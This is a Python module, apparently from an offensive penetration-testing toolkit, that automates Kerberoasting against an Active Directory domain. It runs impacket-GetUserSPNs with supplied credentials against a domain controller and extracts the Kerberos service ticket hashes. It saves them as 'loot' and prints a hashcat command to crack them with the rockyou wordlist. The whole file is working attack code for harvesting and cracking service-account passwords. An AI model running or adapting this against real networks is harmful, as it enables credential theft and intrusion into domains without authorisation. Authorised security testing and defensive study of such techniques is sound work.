# modules/kerberoast.py

from core.colors import red, green, yellow, blue
from core.helpers import run_command, save_loot

def attack_kerberoast(session):
    print(blue("[*] Launching Kerberoasting via impacket-GetUserSPNs..."))

    if session.hash:
        print(red("[-] Kerberoasting with hash is not supported. Use a password session."))
        return

    if not session.password:
        print(red("[-] No password provided. Cannot roast."))
        return

    cmd = (
        f"impacket-GetUserSPNs {session.domain}/{session.username}:'{session.password}' "
        f"-dc-ip {session.dc_ip} -request"
    )

    print(blue(f"[*] Running: {cmd}"))
    out, err = run_command(cmd)
    combined = out + "\n" + err

    hashes = [line for line in combined.splitlines() if "$krb5tgs$" in line]

    if hashes:
        print(green(f"[+] Found {len(hashes)} SPN roastable accounts:"))
        for h in hashes:
            print(green(h))
        save_loot("kerberoast_hashes.txt", "\n".join(hashes))
        print(yellow("  Crack with:"))
        print(yellow("    hashcat -m 13100 -a 0 loot/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt"))
    else:
        print(yellow("[*] No Kerberoastable users found."))
        if err:
            print(red(err.strip()))
